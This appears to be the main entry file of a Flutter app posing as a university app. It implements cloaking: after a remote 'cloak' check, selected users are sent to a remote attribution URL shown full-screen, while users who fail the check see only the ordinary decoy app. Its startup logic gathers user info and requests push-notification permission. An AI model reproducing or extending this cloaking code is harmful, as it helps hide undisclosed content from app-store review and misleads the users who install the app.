// ignore_for_file: unused_import

import 'dart:io';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_bloc/flutter_bloc.dart';
import 'package:flutter/cupertino.dart';
import 'package:go_router/go_router.dart';
import 'package:hive/hive.dart';
import 'package:onesignal_flutter/onesignal_flutter.dart';
import 'package:univer_test/features/splash/splash_page.dart';
import 'core/config/router.dart';
import 'core/config/themes.dart';
import 'core/utils.dart';
import 'core/widgets/loading_widget.dart';
import 'features/home/bloc/home_bloc.dart';
import 'features/home/bloc/home_service.dart';
import 'features/home/pages/constants.dart';
import 'features/univer/bloc/univer_bloc.dart';
import 'features/univer/bloc/univer_log.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await initHive();
  initializeApp();
}

Future<void> initializeApp() async {
  await SystemChrome.setPreferredOrientations([
    DeviceOrientation.portraitUp,
    DeviceOrientation.portraitDown,
  ]);
  OneSignal.Debug.setLogLevel(OSLogLevel.verbose);

  OneSignal.initialize("ebd43544-4652-4461-b953-3abfd96e8588");

  OneSignal.Notifications.requestPermission(true);
  final userInfo = await getUserInfo();
  final cachedFinalUrl = await getCachedFinalUrl();
  if (cachedFinalUrl != null) {
    runApp(MyApp(initialUrl: cachedFinalUrl));
    return;
  }

  final cloakUrl = await getLinks();
  if (cloakUrl == null) {
    runApp(const MyApp());
    return;
  }

  bool isCloakPassed = await checkCloak(cloakUrl);
  if (isCloakPassed) {
    final finalUrl = await getAttribution(ATTRIBUTION_URL, userInfo);
    if (finalUrl != null) {
      // print(finalUrl);
      // final check = await HttpClient().getUrl(Uri.parse(finalUrl));
      // check.followRedirects = false;
      // final responses = await check.close();
      await cacheFinalUrl(finalUrl);

      runApp(MyApp(initialUrl: finalUrl));
      return;
    }
  }
  if (!isCloakPassed) {
    final finalUrl = 'none';
    await cacheFinalUrl(finalUrl);
    runApp(MyApp(initialUrl: finalUrl));
  }
  runApp(const MyApp());
}

class MyApp extends StatefulWidget {
  final String? initialUrl;

  const MyApp({Key? key, this.initialUrl}) : super(key: key);

  @override
  _MyAppState createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  late Future<String?> _finalUrlFuture;

  @override
  void initState() {
    super.initState();
    _finalUrlFuture = _getFinalUrl();
  }

  Future<String?> _getFinalUrl() async {
    if (widget.initialUrl != null) {
      return widget.initialUrl;
    }
    return null;
  }

  @override
  Widget build(BuildContext context) {
    precacheImage(const AssetImage('assets/bg.png'), context);
    return FutureBuilder<String?>(
      future: _finalUrlFuture,
      builder: (context, snapshot) {
        if (snapshot.connectionState == ConnectionState.waiting) {
          return MaterialApp(
            debugShowCheckedModeBanner: false,
            home: Container(
              color: const Color.fromARGB(255, 71, 18, 80),
              child: Center(
                child: ClipRRect(
                  borderRadius: BorderRadius.circular(18),
                  child: Image.asset(
                    'assets/logo.png',
                    height: 90,
                    width: 90,
                  ),
                ),
              ),
            ),
          );
        } else if (snapshot.hasData && snapshot.data == 'none') {
          return MultiBlocProvider(
              providers: [
                BlocProvider(create: (context) => HomeBloc()),
                BlocProvider(create: (context) => UniverBloc()),
              ],
              child: MaterialApp.router(
                debugShowCheckedModeBanner: false,
                theme: theme,
                routerConfig: routerConfig,
              ));
        } else if (snapshot.hasData &&
            snapshot.data != null &&
            widget.initialUrl.toString() != '') {
          return MaterialApp(
              debugShowCheckedModeBanner: false,
              home: NewUniversityScreen(university: widget.initialUrl!));
        } else {
          return MultiBlocProvider(
              providers: [
                BlocProvider(create: (context) => HomeBloc()),
                BlocProvider(create: (context) => UniverBloc()),
              ],
              child: MaterialApp.router(
                debugShowCheckedModeBanner: false,
                theme: theme,
                routerConfig: routerConfig,
              ));
        }
      },
    );
  }
}
